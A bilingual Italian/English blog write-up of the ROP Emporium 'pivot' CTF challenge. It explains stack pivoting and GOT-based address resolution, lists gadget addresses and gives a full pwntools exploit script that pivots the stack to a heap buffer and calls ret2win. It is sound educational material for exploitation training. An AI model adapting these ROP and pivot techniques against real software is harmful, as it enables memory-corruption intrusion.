---
layout: cyber-post
title: "ROP Emporium: pivot - Stack pivoting & resolving a real address"
date: 2024-11-28
categories: 
  - writeups
  - stack
tags:
  - rop
  - stack pivot
  - got
  - plt
  - rop emporium
  - stack
  - pwn
  - ctf
excerpt: "Writeup di pivot (ROP Emporium): spazio ridotto sullo stack, quindi si fa pivot su un buffer nell'heap e si risolve a runtime l'indirizzo reale di ret2win dalla GOT"
---

<div id="star-alert" class="star-alert">
  <div class="star-alert-content">
    <span class="star-icon">⭐</span>
    <span class="star-text lang-it">Ti piace il sito?</span>
    <span class="star-text lang-en">Do you like the site?</span>
    <br>
    <span class="star-text lang-it">Lascia una stella su GitHub!</span>
    <span class="star-text lang-en">Leave a star on GitHub!</span>
    <br>
    <a href="https://github.com/Chris1sFlaggin/Chris1sFlaggin.github.io" target="_blank" class="star-button">
      <span class="lang-it">⭐ Stella</span>
      <span class="lang-en">⭐ Star</span>
    </a>
    <button id="close-star-alert" class="close-button">&times;</button>
  </div>
</div>

<div class="lang-it" markdown="1">
PWN CTF challenge write up. Challenge della serie **ROP Emporium**: la più istruttiva del set base.

---

# pivot

## Il problema

In `pivot` lo spazio per la catena ROP sullo stack è **troppo piccolo** per fare tutto lì. Il programma però ci dà due cose:

1. Un buffer ampio in un'altra regione (heap), di cui ci **stampa l'indirizzo**.
2. Una funzione `foothold_function()` importata da una libreria (`libpivot.so`), che possiamo chiamare via PLT. La vera vincitrice, `ret2win()`, non è chiamata da nessuna parte e — cosa importante — è a un **offset noto** da `foothold_function` all'interno della libreria.

L'idea si divide in due fasi:

- **Fase A (nel buffer heap)**: costruiamo lì la catena "lunga" che risolve `ret2win`.
- **Fase B (nello stack piccolo)**: facciamo il **pivot**, cioè spostiamo `rsp` sul buffer heap così che la catena della fase A venga eseguita.

Gadget principali:

</div>

<div class="lang-en" markdown="1">
PWN CTF challenge write up. Challenge from the **ROP Emporium** series: the most instructive of the base set.

---

# pivot

## The problem

In `pivot` the room for the ROP chain on the stack is **too small** to do everything there. But the program gives us two things:

1. A large buffer in another region (heap), whose **address it prints** for us.
2. A `foothold_function()` imported from a library (`libpivot.so`) that we can call via the PLT. The actual winner, `ret2win()`, is never called and — crucially — sits at a **known offset** from `foothold_function` inside the library.

The idea splits in two phases:

- **Phase A (in the heap buffer)**: build there the "long" chain that resolves `ret2win`.
- **Phase B (in the small stack)**: perform the **pivot**, i.e. move `rsp` onto the heap buffer so the phase-A chain executes.

Main gadgets:

</div>

```zsh
0x4009bd : xchg rax, rsp ; ret        # il pivot vero e proprio
0x4009bb : pop rax ; ret
0x4009c0 : mov rax, [rax] ; ret        # deref: legge dalla GOT
0x4009c4 : add rax, rbp ; ret
0x4007c8 : pop rbp ; ret
0x4006b0 : call rax
0x400720 : foothold_function (PLT)
0x601040 : foothold_function (GOT entry)
```

<div class="lang-it" markdown="1">
## L'exploit

### Fase A — catena nel buffer heap

1. Chiamiamo `foothold_function` via PLT: questo **forza il linker a risolvere** il suo indirizzo reale e a scriverlo nella GOT (`0x601040`).
2. `pop rax ; ret` → `rax = 0x601040` (indirizzo della entry GOT), poi `mov rax, [rax]` → ora `rax` contiene l'**indirizzo runtime reale** di `foothold_function`.
3. `pop rbp ; ret` → `rbp = offset(ret2win - foothold_function)`; `add rax, rbp` → `rax` ora punta a `ret2win`.
4. `call rax` → salto a `ret2win`, flag.

</div>

<div class="lang-en" markdown="1">
## The exploit

### Phase A — chain in the heap buffer

1. Call `foothold_function` via PLT: this **forces the linker to resolve** its real address and write it into the GOT (`0x601040`).
2. `pop rax ; ret` → `rax = 0x601040` (the GOT entry address), then `mov rax, [rax]` → now `rax` holds the **real runtime address** of `foothold_function`.
3. `pop rbp ; ret` → `rbp = offset(ret2win - foothold_function)`; `add rax, rbp` → `rax` now points at `ret2win`.
4. `call rax` → jump to `ret2win`, flag.

</div>

```python
from pwn import *

p = remote('192.168.0.200', 1243)
e = ELF('./libpivot.so')

win_off = p64(e.symbols['ret2win'] - e.symbols['foothold_function'])

p.recvuntil(b'pivot: ')
heap_leak = p64(int(p.recvuntil(b'\n').decode().strip(), 16))

xchg_rax_rsp = p64(0x4009bd)
pop_rax      = p64(0x4009bb)
foothold_plt = p64(0x400720)
foothold_got = p64(0x601040)
deref_rax    = p64(0x4009c0)     # mov rax, [rax]
pop_rbp      = p64(0x4007c8)
add_rax_rbp  = p64(0x4009c4)
call_rax     = p64(0x4006b0)

# Fase A: catena nel buffer heap
payload_heap = flat({
    0:  foothold_plt,   # risolve foothold in GOT
    8:  pop_rax, 16: foothold_got, 24: deref_rax,     # rax = *GOT = foothold reale
    32: pop_rbp, 40: win_off, 48: add_rax_rbp,        # rax = foothold + offset = ret2win
    56: call_rax,
})
p.sendlineafter(b'land there', payload_heap)

# Fase B: pivot dello stack sul buffer heap
payload_stack = flat({
    40: pop_rax, 48: heap_leak, 56: xchg_rax_rsp,     # rsp <- heap_leak
})
p.sendlineafter(b'stack smash', payload_stack)

p.interactive()
```

<div class="lang-it" markdown="1">
### Perché funziona

Due concetti in una challenge sola:

- **Stack pivot**: `xchg rax, rsp` sposta l'esecuzione della catena dove abbiamo spazio a piacere. Fondamentale quando l'overflow ti dà pochi byte oltre il return address.
- **Risoluzione da GOT**: non conosci l'indirizzo runtime di una funzione di libreria? Chiamala una volta via PLT per farla risolvere, poi leggi la sua entry GOT e aggiungici l'offset (noto, costante) verso il simbolo che ti interessa. È lo stesso ragionamento alla base dei leak di libc.

> 💭 Se hai bisogno di chiarimenti scrivimi pure su discord: *chris1sflaggin*.
</div>

<div class="lang-en" markdown="1">
### Why it works

Two concepts in a single challenge:

- **Stack pivot**: `xchg rax, rsp` moves chain execution to where we have as much room as we like. Essential when the overflow gives you only a few bytes past the return address.
- **GOT resolution**: don't know the runtime address of a library function? Call it once via the PLT to have it resolved, then read its GOT entry and add the (known, constant) offset to the symbol you care about. It's the same reasoning behind libc leaks.

> 💭 If you need any clarification, feel free to text me on discord: *chris1sflaggin*.
</div>
